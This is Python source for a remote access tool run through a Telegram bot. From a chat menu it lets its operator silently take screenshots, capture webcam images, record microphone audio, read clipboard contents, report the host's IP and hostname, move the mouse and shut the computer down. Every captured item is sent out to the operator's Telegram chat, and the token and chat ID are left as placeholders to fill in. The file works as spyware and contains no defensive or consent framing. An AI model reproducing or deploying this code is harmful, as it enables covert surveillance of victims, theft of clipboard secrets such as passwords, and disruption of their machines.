import os
import platform
import pyperclip
import pyautogui
import cv2
import sounddevice as sd
import soundfile as sf
import socket
import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# ================= Embedded Config ================= #
BOT_TOKEN = "0"
CHAT_ID = 0  # <-- Replace with your Telegram chat ID
username = platform.node()

# ================= Helper Functions ================= #
def take_screenshot(path="screenshot.png"):
    screenshot = pyautogui.screenshot()
    screenshot.save(path)
    return path

def capture_webcam(path="webcam.png"):
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    if ret:
        cv2.imwrite(path, frame)
    cap.release()
    cv2.destroyAllWindows()
    return path if ret else None

def record_audio(duration=5, path="audio.wav", fs=44100):
    audio = sd.rec(int(duration * fs), samplerate=fs, channels=2)
    sd.wait()
    sf.write(path, audio, fs)
    return path

def get_clipboard():
    return pyperclip.paste()

def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
    except:
        ip = "127.0.0.1"
    finally:
        s.close()
    return ip

def move_mouse_random():
    import random, time
    width, height = pyautogui.size()
    for _ in range(20):
        x, y = random.randint(0, width), random.randint(0, height)
        pyautogui.moveTo(x, y, duration=0.2)

# ================= Command /start ================= #
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("⚠️ Show Alert Box", callback_data="show_alert")],
        [InlineKeyboardButton("📋 Get Clipboard", callback_data="get_clipboard")],
        [InlineKeyboardButton("🌐 Get IP Address", callback_data="get_ip")],
        [InlineKeyboardButton("📸 Screenshot", callback_data="get_screenshot")],
        [InlineKeyboardButton("📷 Webcam", callback_data="get_webcam")],
        [InlineKeyboardButton("🎤 Record Audio", callback_data="record_audio")],
        [InlineKeyboardButton("🖱️ Move Mouse", callback_data="move_mouse")],
        [InlineKeyboardButton("⏻ Shutdown PC", callback_data="shutdown_pc")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await context.bot.send_message(
        chat_id=CHAT_ID,
        text=f"✅ {username} is connected!\nChoose a command:",
        reply_markup=reply_markup,
    )

# ================= Button Callback ================= #
async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    result = query.data

    if result == "show_alert":
        await context.bot.send_message(chat_id=CHAT_ID, text="⚠️ Showing alert box...")
        await asyncio.to_thread(pyautogui.alert, "⚠️ Alert From System!")

    elif result == "get_clipboard":
        text = await asyncio.to_thread(get_clipboard)
        await context.bot.send_message(chat_id=CHAT_ID, text=f"📋 Clipboard: {text}")

    elif result == "get_ip":
        ip = await asyncio.to_thread(get_ip)
        await context.bot.send_message(chat_id=CHAT_ID, text=f"🌐 IP Address: {ip}")

    elif result == "get_screenshot":
        await context.bot.send_message(chat_id=CHAT_ID, text="📸 Taking screenshot...")
        path = await asyncio.to_thread(take_screenshot)
        if os.path.exists(path):
            await context.bot.send_photo(chat_id=CHAT_ID, photo=open(path, "rb"))
            os.remove(path)
        else:
            await context.bot.send_message(chat_id=CHAT_ID, text="❌ Screenshot failed.")

    elif result == "get_webcam":
        await context.bot.send_message(chat_id=CHAT_ID, text="📷 Capturing webcam...")
        path = await asyncio.to_thread(capture_webcam)
        if path and os.path.exists(path):
            await context.bot.send_photo(chat_id=CHAT_ID, photo=open(path, "rb"))
            os.remove(path)
        else:
            await context.bot.send_message(chat_id=CHAT_ID, text="❌ Webcam capture failed.")

    elif result == "record_audio":
        await context.bot.send_message(chat_id=CHAT_ID, text="🎤 Recording audio 5s...")
        path = await asyncio.to_thread(record_audio)
        if os.path.exists(path):
            await context.bot.send_audio(chat_id=CHAT_ID, audio=open(path, "rb"))
            os.remove(path)
        else:
            await context.bot.send_message(chat_id=CHAT_ID, text="❌ Audio recording failed.")

    elif result == "move_mouse":
        await context.bot.send_message(chat_id=CHAT_ID, text="🖱️ Moving mouse randomly...")
        await asyncio.to_thread(move_mouse_random)
        await context.bot.send_message(chat_id=CHAT_ID, text="✅ Done moving mouse.")

    elif result == "shutdown_pc":
        await context.bot.send_message(chat_id=CHAT_ID, text="⏻ Shutting down the PC in 5 seconds...")
        if os.name == "nt":
            os.system("shutdown /s /t 5")
        else:
            os.system("shutdown -h now")

# ================= Shutdown Command ================= #
async def shutdown_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await context.bot.send_message(chat_id=CHAT_ID, text="⏻ Shutting down the PC in 5 seconds...")
    if os.name == "nt":
        os.system("shutdown /s /t 5")
    else:
        os.system("shutdown -h now")

# ================= Commands List ================= #
async def list_commands(update: Update, context: ContextTypes.DEFAULT_TYPE):
    commands_text = (
        "/start - Show main menu with buttons\n"
        "/shutdown - Shutdown the PC\n"
        "/commands - Show this list\n"
        "Buttons:\n"
        "⚠️ Show Alert Box\n"
        "📋 Get Clipboard\n"
        "🌐 Get IP Address\n"
        "📸 Screenshot\n"
        "📷 Webcam\n"
        "🎤 Record Audio\n"
        "🖱️ Move Mouse\n"
        "⏻ Shutdown PC\n"
    )
    await context.bot.send_message(chat_id=CHAT_ID, text=commands_text)

# ================= Main ================= #
if __name__ == "__main__":
    application = Application.builder().token(BOT_TOKEN).build()

    # Command handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("shutdown", shutdown_command))
    application.add_handler(CommandHandler("commands", list_commands))

    # Button handler
    application.add_handler(CallbackQueryHandler(button))

    print("🤖 Bot is running...")
    application.run_polling()
